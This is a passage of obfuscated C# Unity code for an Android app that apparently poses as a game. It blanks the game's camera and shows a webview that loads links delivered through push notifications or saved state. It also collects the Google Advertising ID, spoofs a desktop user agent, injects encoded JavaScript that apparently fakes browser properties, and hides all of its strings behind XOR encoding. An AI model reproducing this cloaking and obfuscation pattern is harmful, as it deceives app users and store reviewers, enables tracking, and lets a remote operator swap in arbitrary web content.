            var _0x2133d5ad = new byte[_0xa65b1000.Length + _0x406dedf0.Length];
            Buffer.BlockCopy(_0xa65b1000, 0, _0x2133d5ad, 0, _0xa65b1000.Length);
            Buffer.BlockCopy(_0x406dedf0, 0, _0x2133d5ad, _0xa65b1000.Length, _0x406dedf0.Length);
            return Encode93(_0x2133d5ad);
        }
        catch (Exception)
        {
            return "";
        }
    }

    private string _0x3ae8584b = "";
    private string _0xe4cc87f4 = "";
    private void _0xb02eeeb7()
    {
        _0x2ac5d5d2 = true;
        if (_0x0d771b38 != null)
            _0x0d771b38.SetUserAgent(_0xb641090d());
    }

    private bool _0x77a8adb2(string _0x4e96d823, string _0xa7cc370e)
    {
        string _0x920195bd = _0x50a2064e(_0x4e96d823);
        if (string.IsNullOrEmpty(_0x920195bd))
            _0x920195bd = _0xa7cc370e;
        if (_0x8d31ab8c(_0x920195bd))
            return true;
        string _0x61a4afc2 = string.IsNullOrEmpty(_0x920195bd) ? _0x530a90e8._0xfeee60cc(new byte[29] { 125, 97, 97, 101, 102, 47, 58, 58, 101, 121, 116, 108, 59, 114, 122, 122, 114, 121, 112, 59, 118, 122, 120, 58, 102, 97, 122, 103, 112 }, 21) : _0x530a90e8._0xfeee60cc(new byte[46] { 133, 153, 153, 157, 158, 215, 194, 194, 157, 129, 140, 148, 195, 138, 130, 130, 138, 129, 136, 195, 142, 130, 128, 194, 158, 153, 130, 159, 136, 194, 140, 157, 157, 158, 194, 137, 136, 153, 140, 132, 129, 158, 210, 132, 137, 208 }, 237) + _0x920195bd;
        WLog(_0x530a90e8._0xfeee60cc(new byte[35] { 171, 128, 154, 135, 133, 141, 164, 129, 131, 141, 200, 133, 137, 154, 131, 141, 156, 200, 142, 137, 132, 132, 138, 137, 139, 131, 200, 137, 155, 200, 159, 141, 138, 210, 200 }, 232) + _0x61a4afc2);
        return _0xfaedf53f(_0x61a4afc2);
    }

    private Action _0x4598433a;
    static byte[] DecompressDeflate(byte[] _0x9181d878)
    {
        using var _0x147b14cc = new MemoryStream(_0x9181d878);
        using var _0xc0f0924e = new DeflateStream(_0x147b14cc, CompressionMode.Decompress);
        using var _0xd7792100 = new MemoryStream();
        _0xc0f0924e.CopyTo(_0xd7792100);
        return _0xd7792100.ToArray();
    }

    private IEnumerator _0xc9774d83(Dictionary<string, object> _0xd43d3107)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[30] { 197, 202, 251, 237, 234, 195, 190, 216, 251, 234, 253, 246, 190, 219, 230, 234, 236, 255, 190, 206, 235, 237, 246, 190, 218, 255, 234, 255, 164, 190 }, 158) + string.Join(_0x530a90e8._0xfeee60cc(new byte[1] { 90 }, 83), _0xd43d3107));
#endif
            }
        }

        string _0xa2019fee = "";
        // Primary source: nested JSON under "notificationData"
        if (_0xd43d3107 != null && _0xd43d3107.TryGetValue(_0x530a90e8._0xfeee60cc(new byte[16] { 204, 205, 214, 203, 196, 203, 193, 195, 214, 203, 205, 204, 230, 195, 214, 195 }, 162), out var raw))
        {
            try
            {
                var _0xf273078e = raw?.ToString();
                var _0xe071277c = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xf273078e);
                if (_0xe071277c != null && _0xe071277c.TryGetValue(_0x530a90e8._0xfeee60cc(new byte[6] { 241, 231, 236, 230, 235, 230 }, 130), out var val))
                {
                    _0xa2019fee = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x530a90e8._0xfeee60cc(new byte[30] { 110, 97, 80, 70, 65, 21, 101, 64, 70, 93, 104, 21, 127, 102, 122, 123, 21, 69, 84, 71, 70, 80, 21, 80, 71, 71, 90, 71, 15, 21 }, 53) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0xa2019fee) && _0xd43d3107 != null && _0xd43d3107.TryGetValue(_0x530a90e8._0xfeee60cc(new byte[6] { 212, 194, 201, 195, 206, 195 }, 167), out var lab))
        {
            _0xa2019fee = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[38] { 214, 217, 232, 254, 249, 173, 221, 248, 254, 229, 208, 173, 203, 232, 249, 238, 229, 232, 233, 173, 254, 232, 227, 233, 228, 233, 173, 235, 255, 226, 224, 173, 231, 254, 226, 227, 183, 173 }, 141) + _0xa2019fee);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0xa2019fee))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[38] { 232, 231, 214, 192, 199, 147, 227, 198, 192, 219, 238, 147, 228, 210, 218, 199, 147, 199, 220, 147, 220, 195, 214, 221, 147, 196, 218, 199, 219, 147, 192, 214, 221, 215, 218, 215, 137, 147 }, 179) + _0xa2019fee);
            }
#endif
        }

        _0x17443fd4 = _0xa2019fee;
        yield return new WaitUntil(() => _0xb2d2a6ba);
        var _0xdff91f8e = _0x809d7bf4(2, 100);
        yield return new WaitUntil(() => _0xdff91f8e.IsCompleted);
        string _0x06fc4cf7 = _0xdff91f8e.Result;
        if (!string.IsNullOrEmpty(_0x06fc4cf7))
        {
            string _0x532c1de0 = _0x846ce3b4(_0x06fc4cf7, _0xa2019fee);
            {
#if B_LOGS
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[33] { 203, 196, 245, 227, 228, 176, 192, 229, 227, 248, 205, 176, 194, 245, 252, 255, 241, 244, 176, 199, 245, 242, 198, 249, 245, 231, 176, 231, 249, 228, 248, 170, 176 }, 144) + _0x532c1de0);
#endif
            }

            _0x0d771b38.Load(_0x532c1de0);
        }
    }

    private AndroidJavaObject _0xdb87d7aa { get; set; }

    private async Task<string> _0x809d7bf4(int _0xd49cc00b = 5, int _0x561cb383 = 500)
    {
        try
        {
            CommState _0x8d875581 = default;
            int _0xaf314887 = 0;
            do
            {
                _0x8d875581 = await _0x45007c03();
                if (_0x8d875581.Ready)
                    break;
                await Task.Delay(_0x561cb383);
            }
            while (_0xaf314887++ < _0xd49cc00b);
            var _0x080d2d9a = _0x8d875581.Ready && !_0x8d875581.IsPrivacy ? _0x8d875581.SavedLink : string.Empty;
            {
#if B_LOGS
                {
                    Debug.Log(_0x530a90e8._0xfeee60cc(new byte[24] { 111, 96, 81, 71, 64, 105, 20, 120, 91, 85, 80, 20, 71, 85, 66, 81, 80, 20, 88, 93, 90, 95, 14, 20 }, 52) + _0x080d2d9a);
                }
#endif
            }

            return _0x080d2d9a ?? string.Empty;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x530a90e8._0xfeee60cc(new byte[39] { 253, 242, 195, 213, 210, 251, 134, 225, 195, 210, 134, 201, 212, 134, 214, 199, 212, 213, 195, 134, 213, 199, 208, 195, 194, 134, 202, 207, 200, 205, 134, 192, 199, 207, 202, 195, 194, 156, 134 }, 166) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    private readonly List<UniWebViewPopup> _0x98e8c3c0 = new List<UniWebViewPopup>();
    private void _0x24289db0()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    static string Encode93(byte[] _0x90aba868)
    {
        var _0x7e24b2dc = new byte[_0x90aba868.Length + 1];
        _0x7e24b2dc[0] = 1;
        Buffer.BlockCopy(_0x90aba868, 0, _0x7e24b2dc, 1, _0x90aba868.Length);
        var _0xb8824fd0 = FromBigEndian(_0x7e24b2dc);
        var _0xfcba5b04 = new Stack<char>();
        var _0xaa66b780 = new System.Numerics.BigInteger(TextAlphabet.Length);
        while (_0xb8824fd0 > 0)
        {
            _0xb8824fd0 = System.Numerics.BigInteger.DivRem(_0xb8824fd0, _0xaa66b780, out var rem);
            _0xfcba5b04.Push(TextAlphabet[(int)rem]);
        }

        return new string (_0xfcba5b04.ToArray());
    }

    private string _0xb01285b4()
    {
        return ((char)('a' + _0xb4c7e623.Next(0, 26))).ToString();
    }

    internal void Update()
    {
        if (_0x0d771b38 == null)
            return;
        if (_0x68058556())
            _0x501a5d08();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0x18b3b0ae();
        if (_0xa24d4f97 && _0xe999ef58 != null)
            _0xe999ef58.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private IEnumerator _0xa46aee83(string _0xfd4dfec9)
    {
        if (_0x0d771b38 != null && _0xb2d2a6ba)
            yield break;
        _0x0d771b38 = gameObject.AddComponent<UniWebView>();
        _0x584fbae0(_0x0d771b38);
        _0x4a0da38f(_0x0d771b38);
        _0x0d771b38.BackgroundColor = Color.clear;
        var _0x4a373bcb = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0x18b3b0ae();
        yield return new WaitForEndOfFrame();
        _0xb2d2a6ba = true;
        _0x8b82db9b();
        _0x0caec46a(true);
        _0xa72c34cb = false;
        _0x2ac5d5d2 = false;
        _0x98e8c3c0.Clear();
        _0x04258118 = -1;
        firstLoadShown = false;
        _0x440f35f6 = false;
        _0x0d39213f = false;
        _0x0d771b38.SetUserAgent("");
        _0x51444364 = Time.realtimeSinceStartup;
        _0x0d771b38.Stop();
        _0x0d771b38.Load(_0xfd4dfec9);
        _0x0d771b38.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x530a90e8._0xfeee60cc(new byte[25] { 217, 245, 253, 250, 180, 195, 241, 246, 194, 253, 241, 227, 180, 221, 250, 253, 224, 253, 245, 248, 180, 199, 252, 251, 227 }, 148));
    }

    static readonly int[] _0xc7eae7d4 = BuildTextAlphabetIndex();
    private bool _0x62aa9627()
    {
        var _0xe49b691c = _0x8f4547c7();
        if (_0xe49b691c == null)
            return false;
        WLog(_0x530a90e8._0xfeee60cc(new byte[31] { 110, 71, 84, 66, 81, 71, 84, 67, 6, 68, 71, 69, 77, 6, 11, 24, 6, 86, 73, 86, 83, 86, 6, 97, 73, 100, 71, 69, 77, 28, 6 }, 38) + _0xe49b691c.Id);
        _0xe49b691c.GoBack();
        return true;
    }

    private async Task<bool> _0x22919be2()
    {
        _0x6c2d213c.Instance?._0x12c9c677();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0xb7efab1c) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x530a90e8._0xfeee60cc(new byte[32] { 175, 160, 145, 135, 128, 169, 212, 161, 154, 157, 128, 141, 212, 164, 129, 135, 156, 212, 186, 155, 128, 157, 146, 157, 151, 149, 128, 157, 155, 154, 206, 212 }, 244) + string.Join(_0x530a90e8._0xfeee60cc(new byte[1] { 8 }, 1), _0xb7efab1c));
                }
#endif
            }
        };
        try
        {
            _0x1de60d77 = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x530a90e8._0xfeee60cc(new byte[31] { 105, 102, 87, 65, 70, 111, 18, 116, 83, 91, 94, 87, 86, 18, 70, 93, 18, 85, 87, 70, 18, 66, 71, 65, 90, 18, 70, 93, 89, 87, 92 }, 50));
                }
#endif
            }

            _0x1de60d77 = "";
        }

        _0x27211b0e = !string.IsNullOrEmpty(_0x1de60d77);
        _0xdacf57d1 = _0xc392a561();
        {
#if B_LOGS
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[25] { 64, 79, 126, 104, 111, 70, 59, 78, 117, 114, 111, 98, 59, 75, 110, 104, 115, 59, 79, 116, 112, 126, 117, 33, 59 }, 27) + _0x1de60d77);
#endif
        }

        _0x6c2d213c.Instance?._0x45003897();
        return false;
    }

    private string _0xd11c8114()
    {
        return _0x530a90e8._0xfeee60cc(new byte[12] { 150, 216, 203, 208, 221, 202, 215, 209, 208, 150, 151, 197 }, 190) + _0x530a90e8._0xfeee60cc(new byte[8] { 0, 23, 4, 86, 3, 23, 75, 81 }, 118) + WindowsDesktopUserAgent + _0x530a90e8._0xfeee60cc(new byte[2] { 38, 58 }, 1) + _0x530a90e8._0xfeee60cc(new byte[30] { 31, 8, 27, 73, 25, 27, 6, 29, 6, 84, 39, 8, 31, 0, 14, 8, 29, 6, 27, 71, 25, 27, 6, 29, 6, 29, 16, 25, 12, 82 }, 105) + _0x530a90e8._0xfeee60cc(new byte[121] { 4, 23, 12, 1, 22, 11, 13, 12, 66, 6, 7, 4, 74, 13, 0, 8, 78, 9, 7, 27, 78, 20, 3, 14, 75, 25, 22, 16, 27, 25, 45, 0, 8, 7, 1, 22, 76, 6, 7, 4, 11, 12, 7, 50, 16, 13, 18, 7, 16, 22, 27, 74, 13, 0, 8, 78, 9, 7, 27, 78, 25, 5, 7, 22, 88, 4, 23, 12, 1, 22, 11, 13, 12, 74, 75, 25, 16, 7, 22, 23, 16, 12, 66, 20, 3, 14, 89, 31, 78, 1, 13, 12, 4, 11, 5, 23, 16, 3, 0, 14, 7, 88, 22, 16, 23, 7, 31, 75, 89, 31, 1, 3, 22, 1, 10, 74, 7, 75, 25, 31, 31 }, 98) + _0x530a90e8._0xfeee60cc(new byte[26] { 113, 112, 115, 61, 101, 103, 122, 97, 122, 57, 50, 96, 102, 112, 103, 84, 114, 112, 123, 97, 50, 57, 96, 116, 60, 46 }, 21) + _0x530a90e8._0xfeee60cc(new byte[130] { 164, 165, 166, 232, 176, 178, 175, 180, 175, 236, 231, 161, 176, 176, 150, 165, 178, 179, 169, 175, 174, 231, 236, 231, 245, 238, 240, 224, 232, 151, 169, 174, 164, 175, 183, 179, 224, 142, 148, 224, 241, 240, 238, 240, 251, 224, 151, 169, 174, 246, 244, 251, 224, 184, 246, 244, 233, 224, 129, 176, 176, 172, 165, 151, 165, 162, 139, 169, 180, 239, 245, 243, 247, 238, 243, 246, 224, 232, 139, 136, 148, 141, 140, 236, 224, 172, 169, 171, 165, 224, 135, 165, 163, 171, 175, 233, 224, 131, 168, 178, 175, 173, 165, 239, 241, 242, 240, 238, 240, 238, 240, 238, 240, 224, 147, 161, 166, 161, 178, 169, 239, 245, 243, 247, 238, 243, 246, 231, 233, 251 }, 192) + _0x530a90e8._0xfeee60cc(new byte[30] { 34, 35, 32, 110, 54, 52, 41, 50, 41, 106, 97, 54, 42, 39, 50, 32, 41, 52, 43, 97, 106, 97, 17, 47, 40, 117, 116, 97, 111, 125 }, 70) + _0x530a90e8._0xfeee60cc(new byte[34] { 79, 78, 77, 3, 91, 89, 68, 95, 68, 7, 12, 93, 78, 69, 79, 68, 89, 12, 7, 12, 108, 68, 68, 76, 71, 78, 11, 98, 69, 72, 5, 12, 2, 16 }, 43) + _0x530a90e8._0xfeee60cc(new byte[30] { 33, 32, 35, 109, 53, 55, 42, 49, 42, 105, 98, 40, 36, 61, 17, 42, 48, 38, 45, 21, 42, 44, 43, 49, 54, 98, 105, 117, 108, 126 }, 69) + _0x530a90e8._0xfeee60cc(new byte[449] { 41, 47, 36, 38, 43, 60, 47, 125, 40, 60, 57, 96, 38, 63, 47, 60, 51, 57, 46, 103, 6, 38, 63, 47, 60, 51, 57, 103, 122, 30, 53, 47, 50, 48, 52, 40, 48, 122, 113, 43, 56, 47, 46, 52, 50, 51, 103, 122, 108, 111, 109, 122, 32, 113, 38, 63, 47, 60, 51, 57, 103, 122, 26, 50, 50, 58, 49, 56, 125, 30, 53, 47, 50, 48, 56, 122, 113, 43, 56, 47, 46, 52, 50, 51, 103, 122, 108, 111, 109, 122, 32, 113, 38, 63, 47, 60, 51, 57, 103, 122, 19, 50, 41, 96, 28, 98, 31, 47, 60, 51, 57, 122, 113, 43, 56, 47, 46, 52, 50, 51, 103, 122, 111, 105, 122, 32, 0, 113, 48, 50, 63, 52, 49, 56, 103, 59, 60, 49, 46, 56, 113, 45, 49, 60, 41, 59, 50, 47, 48, 103, 122, 10, 52, 51, 57, 50, 42, 46, 122, 113, 58, 56, 41, 21, 52, 58, 53, 24, 51, 41, 47, 50, 45, 36, 11, 60, 49, 40, 56, 46, 103, 59, 40, 51, 62, 41, 52, 50, 51, 117, 116, 38, 47, 56, 41, 40, 47, 51, 125, 13, 47, 50, 48, 52, 46, 56, 115, 47, 56, 46, 50, 49, 43, 56, 117, 38, 60, 47, 62, 53, 52, 41, 56, 62, 41, 40, 47, 56, 103, 122, 37, 101, 107, 122, 113, 63, 52, 41, 51, 56, 46, 46, 103, 122, 107, 105, 122, 113, 48, 50, 63, 52, 49, 56, 103, 59, 60, 49, 46, 56, 113, 48, 50, 57, 56, 49, 103, 122, 122, 113, 45, 49, 60, 41, 59, 50, 47, 48, 103, 122, 10, 52, 51, 57, 50, 42, 46, 122, 113, 45, 49, 60, 41, 59, 50, 47, 48, 11, 56, 47, 46, 52, 50, 51, 103, 122, 108, 104, 115, 109, 115, 109, 122, 113, 40, 60, 27, 40, 49, 49, 11, 56, 47, 46, 52, 50, 51, 103, 122, 108, 111, 109, 115, 109, 115, 109, 115, 109, 122, 32, 116, 102, 32, 32, 102, 18, 63, 55, 56, 62, 41, 115, 57, 56, 59, 52, 51, 56, 13, 47, 50, 45, 56, 47, 41, 36, 117, 45, 47, 50, 41, 50, 113, 122, 40, 46, 56, 47, 28, 58, 56, 51, 41, 25, 60, 41, 60, 122, 113, 38, 58, 56, 41, 103, 59, 40, 51, 62, 41, 52, 50, 51, 117, 116, 38, 47, 56, 41, 40, 47, 51, 125, 40, 60, 57, 102, 32, 113, 62, 50, 51, 59, 52, 58, 40, 47, 60, 63, 49, 56, 103, 41, 47, 40, 56, 32, 116, 102, 32, 62, 60, 41, 62, 53, 117, 56, 116, 38, 32 }, 93) + _0x530a90e8._0xfeee60cc(new byte[112] { 149, 148, 151, 217, 130, 146, 131, 148, 148, 159, 221, 214, 134, 152, 149, 133, 153, 214, 221, 192, 200, 195, 193, 216, 202, 149, 148, 151, 217, 130, 146, 131, 148, 148, 159, 221, 214, 153, 148, 152, 150, 153, 133, 214, 221, 192, 193, 201, 193, 216, 202, 149, 148, 151, 217, 130, 146, 131, 148, 148, 159, 221, 214, 144, 135, 144, 152, 157, 166, 152, 149, 133, 153, 214, 221, 192, 200, 195, 193, 216, 202, 149, 148, 151, 217, 130, 146, 131, 148, 148, 159, 221, 214, 144, 135, 144, 152, 157, 185, 148, 152, 150, 153, 133, 214, 221, 192, 193, 197, 193, 216, 202 }, 241) + _0x530a90e8._0xfeee60cc(new byte[45] { 173, 171, 160, 162, 174, 176, 183, 189, 182, 174, 247, 182, 183, 173, 182, 172, 186, 177, 170, 173, 184, 171, 173, 228, 172, 183, 189, 188, 191, 176, 183, 188, 189, 226, 164, 186, 184, 173, 186, 177, 241, 188, 240, 162, 164 }, 217) + _0x530a90e8._0xfeee60cc(new byte[721] { 124, 122, 113, 115, 126, 105, 122, 40, 103, 122, 97, 111, 53, 127, 97, 102, 108, 103, 127, 38, 101, 105, 124, 107, 96, 69, 109, 108, 97, 105, 38, 106, 97, 102, 108, 32, 127, 97, 102, 108, 103, 127, 33, 51, 127, 97, 102, 108, 103, 127, 38, 101, 105, 124, 107, 96, 69, 109, 108, 97, 105, 53, 110, 125, 102, 107, 124, 97, 103, 102, 32, 121, 33, 115, 126, 105, 122, 40, 123, 53, 91, 124, 122, 97, 102, 111, 32, 121, 33, 38, 124, 103, 68, 103, 127, 109, 122, 75, 105, 123, 109, 32, 33, 51, 97, 110, 32, 123, 38, 97, 102, 108, 109, 112, 71, 110, 32, 47, 120, 103, 97, 102, 124, 109, 122, 50, 40, 107, 103, 105, 122, 123, 109, 47, 33, 54, 53, 56, 116, 116, 123, 38, 97, 102, 108, 109, 112, 71, 110, 32, 47, 96, 103, 126, 109, 122, 50, 40, 102, 103, 102, 109, 47, 33, 54, 53, 56, 116, 116, 123, 38, 97, 102, 108, 109, 112, 71, 110, 32, 47, 101, 105, 112, 37, 127, 97, 108, 124, 96, 47, 33, 54, 53, 56, 116, 116, 123, 38, 97, 102, 108, 109, 112, 71, 110, 32, 47, 101, 105, 112, 37, 108, 109, 126, 97, 107, 109, 37, 127, 97, 108, 124, 96, 47, 33, 54, 53, 56, 33, 122, 109, 124, 125, 122, 102, 40, 115, 101, 105, 124, 107, 96, 109, 123, 50, 110, 105, 100, 123, 109, 36, 101, 109, 108, 97, 105, 50, 121, 36, 103, 102, 107, 96, 105, 102, 111, 109, 50, 102, 125, 100, 100, 36, 105, 108, 108, 68, 97, 123, 124, 109, 102, 109, 122, 50, 110, 125, 102, 107, 124, 97, 103, 102, 32, 33, 115, 117, 36, 122, 109, 101, 103, 126, 109, 68, 97, 123, 124, 109, 102, 109, 122, 50, 110, 125, 102, 107, 124, 97, 103, 102, 32, 33, 115, 117, 36, 105, 108, 108, 77, 126, 109, 102, 124, 68, 97, 123, 124, 109, 102, 109, 122, 50, 110, 125, 102, 107, 124, 97, 103, 102, 32, 33, 115, 117, 36, 122, 109, 101, 103, 126, 109, 77, 126, 109, 102, 124, 68, 97, 123, 124, 109, 102, 109, 122, 50, 110, 125, 102, 107, 124, 97, 103, 102, 32, 33, 115, 117, 36, 108, 97, 123, 120, 105, 124, 107, 96, 77, 126, 109, 102, 124, 50, 110, 125, 102, 107, 124, 97, 103, 102, 32, 33, 115, 122, 109, 124, 125, 122, 102, 40, 110, 105, 100, 123, 109, 51, 117, 117, 51, 97, 110, 32, 123, 38, 97, 102, 108, 109, 112, 71, 110, 32, 47, 120, 103, 97, 102, 124, 109, 122, 50, 40, 110, 97, 102, 109, 47, 33, 54, 53, 56, 116, 116, 123, 38, 97, 102, 108, 109, 112, 71, 110, 32, 47, 96, 103, 126, 109, 122, 50, 40, 96, 103, 126, 109, 122, 47, 33, 54, 53, 56, 33, 122, 109, 124, 125, 122, 102, 40, 115, 101, 105, 124, 107, 96, 109, 123, 50, 124, 122, 125, 109, 36, 101, 109, 108, 97, 105, 50, 121, 36, 103, 102, 107, 96, 105, 102, 111, 109, 50, 102, 125, 100, 100, 36, 105, 108, 108, 68, 97, 123, 124, 109, 102, 109, 122, 50, 110, 125, 102, 107, 124, 97, 103, 102, 32, 33, 115, 117, 36, 122, 109, 101, 103, 126, 109, 68, 97, 123, 124, 109, 102, 109, 122, 50, 110, 125, 102, 107, 124, 97, 103, 102, 32, 33, 115, 117, 36, 105, 108, 108, 77, 126, 109, 102, 124, 68, 97, 123, 124, 109, 102, 109, 122, 50, 110, 125, 102, 107, 124, 97, 103, 102, 32, 33, 115, 117, 36, 122, 109, 101, 103, 126, 109, 77, 126, 109, 102, 124, 68, 97, 123, 124, 109, 102, 109, 122, 50, 110, 125, 102, 107, 124, 97, 103, 102, 32, 33, 115, 117, 36, 108, 97, 123, 120, 105, 124, 107, 96, 77, 126, 109, 102, 124, 50, 110, 125, 102, 107, 124, 97, 103, 102, 32, 33, 115, 122, 109, 124, 125, 122, 102, 40, 110, 105, 100, 123, 109, 51, 117, 117, 51, 122, 109, 124, 125, 122, 102, 40, 103, 122, 97, 111, 32, 121, 33, 51, 117, 51, 117, 107, 105, 124, 107, 96, 32, 109, 33, 115, 117 }, 8) + _0x530a90e8._0xfeee60cc(new byte[5] { 81, 5, 4, 5, 23 }, 44);
    }

    static _0x83b84ed4 ReadScoreMetadata(string _0xa5a81cfe)
    {
        if (string.IsNullOrWhiteSpace(_0xa5a81cfe))
            return new _0x83b84ed4();
        try
        {
            return JsonConvert.DeserializeObject<_0x83b84ed4>(_0xa5a81cfe) ?? new _0x83b84ed4();
        }
        catch (Exception)
        {
            return new _0x83b84ed4();
        }
    }

    private bool _0xfaedf53f(string _0x54ffcbd9)
    {
        try
        {
            using (var _0xc0378761 = new AndroidJavaClass(_0x530a90e8._0xfeee60cc(new byte[30] { 170, 166, 164, 231, 188, 167, 160, 189, 176, 250, 173, 231, 185, 165, 168, 176, 172, 187, 231, 156, 167, 160, 189, 176, 153, 165, 168, 176, 172, 187 }, 201)))
            using (var _0x2b7490ff = _0xc0378761.GetStatic<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[15] { 52, 34, 37, 37, 50, 57, 35, 22, 52, 35, 62, 33, 62, 35, 46 }, 87)))
            using (var _0x8f173ff9 = new AndroidJavaClass(_0x530a90e8._0xfeee60cc(new byte[15] { 212, 219, 209, 199, 218, 220, 209, 155, 219, 208, 193, 155, 224, 199, 220 }, 181)))
            using (var _0xa8423852 = _0x8f173ff9.CallStatic<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[5] { 73, 88, 75, 74, 92 }, 57), _0x54ffcbd9))
            using (var _0x94acc951 = new AndroidJavaObject(_0x530a90e8._0xfeee60cc(new byte[22] { 65, 78, 68, 82, 79, 73, 68, 14, 67, 79, 78, 84, 69, 78, 84, 14, 105, 78, 84, 69, 78, 84 }, 32), _0x530a90e8._0xfeee60cc(new byte[26] { 0, 15, 5, 19, 14, 8, 5, 79, 8, 15, 21, 4, 15, 21, 79, 0, 2, 21, 8, 14, 15, 79, 55, 40, 36, 54 }, 97), _0xa8423852))
            {
                WLog(_0x530a90e8._0xfeee60cc(new byte[26] { 241, 218, 192, 221, 223, 215, 254, 219, 217, 215, 146, 221, 194, 215, 220, 146, 215, 202, 198, 215, 192, 220, 211, 222, 136, 146 }, 178) + _0x54ffcbd9);
                _0x94acc951.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[11] { 54, 51, 51, 20, 54, 35, 50, 48, 56, 37, 46 }, 87), _0x530a90e8._0xfeee60cc(new byte[33] { 23, 24, 18, 4, 25, 31, 18, 88, 31, 24, 2, 19, 24, 2, 88, 21, 23, 2, 19, 17, 25, 4, 15, 88, 52, 36, 57, 33, 37, 55, 52, 58, 51 }, 118));
                _0x94acc951.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[8] { 120, 125, 125, 95, 117, 120, 126, 106 }, 25), 0x10000000);
                _0x2b7490ff.Call(_0x530a90e8._0xfeee60cc(new byte[13] { 235, 236, 249, 234, 236, 217, 251, 236, 241, 238, 241, 236, 225 }, 152), _0x94acc951);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x530a90e8._0xfeee60cc(new byte[28] { 173, 134, 156, 129, 131, 139, 162, 135, 133, 139, 206, 139, 150, 154, 139, 156, 128, 143, 130, 206, 136, 143, 135, 130, 139, 138, 212, 206 }, 238) + e.Message);
            Application.OpenURL(_0x54ffcbd9);
            return true;
        }
    }

    // PART 3
    private string _0x60be49de()
    {
        try
        {
            var _0x4ee39e6a = new AndroidJavaClass(_0x530a90e8._0xfeee60cc(new byte[30] { 193, 205, 207, 140, 215, 204, 203, 214, 219, 145, 198, 140, 210, 206, 195, 219, 199, 208, 140, 247, 204, 203, 214, 219, 242, 206, 195, 219, 199, 208 }, 162));
            var _0x34c4252b = _0x4ee39e6a.GetStatic<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[15] { 120, 110, 105, 105, 126, 117, 111, 90, 120, 111, 114, 109, 114, 111, 98 }, 27));
            var _0xaa59f559 = new AndroidJavaClass(_0x530a90e8._0xfeee60cc(new byte[57] { 160, 172, 174, 237, 164, 172, 172, 164, 175, 166, 237, 162, 173, 167, 177, 172, 170, 167, 237, 164, 174, 176, 237, 162, 167, 176, 237, 170, 167, 166, 173, 183, 170, 165, 170, 166, 177, 237, 130, 167, 181, 166, 177, 183, 170, 176, 170, 173, 164, 138, 167, 128, 175, 170, 166, 173, 183 }, 195));
            var _0xc9ead431 = _0xaa59f559.CallStatic<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[20] { 144, 146, 131, 182, 147, 129, 146, 133, 131, 158, 132, 158, 153, 144, 190, 147, 190, 153, 145, 152 }, 247), _0x34c4252b);
            var _0x2c219582 = _0xc9ead431.Call<string>(_0x530a90e8._0xfeee60cc(new byte[5] { 55, 53, 36, 25, 52 }, 80));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0x2c219582}");
#endif
            }

            return string.IsNullOrEmpty(_0x2c219582) ? "" : _0x2c219582;
        }
        catch
        {
            return "";
        }
    }

    private string _0x5d119317 = "";
    private int _0x3a61bd38 = 0;
    private void _0x0caec46a(bool _0x6292c370)
    {
        _0x8b82db9b();
        _0x6db16892.SetActive(_0x6292c370);
        _0xa24d4f97 = _0x6292c370;
        if (_0x6292c370)
        {
            _0x6db16892.transform.SetAsLastSibling();
            if (_0xe999ef58 != null)
                _0xe999ef58.localRotation = Quaternion.identity;
        }
    }

    internal string _0x50a2064e(string _0x90a8455d)
    {
        int _0xd7a66699 = _0x90a8455d.IndexOf(_0x530a90e8._0xfeee60cc(new byte[3] { 124, 113, 40 }, 21), StringComparison.OrdinalIgnoreCase);
        if (_0xd7a66699 < 0)
            return null;
        string _0xfbb9a2af = _0x90a8455d.Substring(_0xd7a66699 + 3);
        int _0x77eea632 = _0xfbb9a2af.IndexOf('&');
        return _0x77eea632 >= 0 ? _0xfbb9a2af.Substring(0, _0x77eea632) : _0xfbb9a2af;
    }

    private void _0x3e484c80(string _0xdba8be31)
    {
        Dictionary<string, object> _0xde13e685;
        try
        {
            _0xde13e685 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xdba8be31);
        }
        catch
        {
            return;
        }

        var _0x7c57c57e = ReadPushField(_0xde13e685, _0x530a90e8._0xfeee60cc(new byte[3] { 232, 239, 241 }, 157));
        if (string.IsNullOrWhiteSpace(_0x7c57c57e))
            return;
        _0x7c57c57e = _0x7c57c57e.Trim();
        if (!IsHttpUrl(_0x7c57c57e))
            return;
        if (string.Equals(_0x7c57c57e, _0xbeab2fad, StringComparison.Ordinal))
            return;
        _0xbeab2fad = _0x7c57c57e;
        OpenUrlExternally(_0x7c57c57e);
